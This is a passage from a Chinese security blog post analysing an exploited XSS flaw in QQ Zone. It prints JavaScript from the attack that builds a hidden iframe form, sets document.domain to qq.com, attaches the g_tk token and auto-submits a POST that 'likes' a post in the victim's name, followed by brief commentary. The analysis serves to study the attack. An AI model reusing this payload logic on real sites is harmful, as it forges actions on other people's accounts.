	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;script type="text/javascript"&gt;'</span><span class="o">+</span><span class="p">(</span><span class="nx">ie</span><span class="o">&amp;&amp;</span><span class="s1">'document.charset="utf-8"'</span><span class="o">||</span><span class="s2">""</span><span class="p">)</span><span class="o">+</span><span class="s1">';document.domain="qq.com";frameElement.submited=void(0);frameElement.state="sending";&lt;</span><span class="err">\</span><span class="s1">/script&gt;&lt;/head&gt;&lt;body&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;form action="'</span><span class="o">+</span><span class="nx">uri</span><span class="o">+</span><span class="p">(</span><span class="nx">uri</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">"?"</span><span class="p">)</span><span class="o">&gt;-</span><span class="mi">1</span><span class="p">?</span><span class="s2">"&amp;"</span><span class="p">:</span><span class="s2">"?"</span><span class="p">)</span><span class="o">+</span><span class="s2">"g_tk="</span><span class="o">+</span><span class="nx">g_tk</span><span class="o">+</span><span class="s1">'" accept-charset="utf-8"  enctype="application/x-www-form-urlencoded;charset=utf-8" method="post"&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;input type="hidden" name="qzreferrer" id="qzreferrer" value='</span><span class="o">+</span><span class="nx">refer</span><span class="o">+</span><span class="s1">'/&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;input type="hidden" name="url" id="url" value='</span><span class="o">+</span><span class="nx">refer</span><span class="o">+</span><span class="s1">'/&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;input type="hidden" name="cid" id="ouin" value="'</span><span class="o">+</span><span class="nx">xqq</span><span class="o">+</span><span class="s1">'" /&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;input type="hidden" name="from" id="from" value="brand" /&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;input type="hidden" name="scene" id="scene" value="5" /&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;input type="hidden" name="fupdate" id="fupdate" value="0" /&gt;'</span><span class="p">;</span>
	<span class="nx">ifrHTML</span><span class="o">=</span><span class="nx">ifrHTML</span><span class="o">+</span><span class="s1">'&lt;/form&gt;&lt;script type="text/javascript"&gt;try{var f=document.getElementById("p");f.submit();}catch(e){}&lt;</span><span class="err">\</span><span class="s1">/script&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ie</span><span class="p">){</span>
		<span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nx">g_sender</span><span class="p">.</span><span class="nx">contentDocument</span><span class="o">||</span><span class="nx">g_sender</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">;</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">d</span><span class="p">){</span>
			<span class="nx">d</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span>
			<span class="nx">d</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">ifrHTML</span><span class="p">);</span>
			<span class="nx">d</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nb">window</span><span class="p">.</span><span class="nx">oncepost</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>
<p>动态创建了一个form，然后post数据，看url是赞了一下某个说说，反正植入js后一切就好办了~~</p>

<p>还有一个加好友的就是无法复现了</p>

<p><img src="http://storage.virusdefender.net/blog/images/347/5.png" alt="QQ20150713-4@2x.png" /></p>



        <section class="author-detail">
            <section class="post-footer-item comment">
                <a href="/comment.html?title=qq%E7%A9%BA%E9%97%B4%E6%9F%90%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84xss%E5%88%86%E6%9E%90&article_id=/index.php/archives/347/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
            </section>
            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 50%;max-height: 50%; display: none;" id="wx-pay">
        </section>
    </article>
</div>


<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<footer class="g-footer">
    <section>virusdefender's blog (＾－＾)V © 2021</section>
    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
</footer>


    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdn.virusdefender.net/assets/js/prism.js"></script>
    <script src="https://cdn.virusdefender.net/assets/js/index.min.js"></script>
</body>
</html>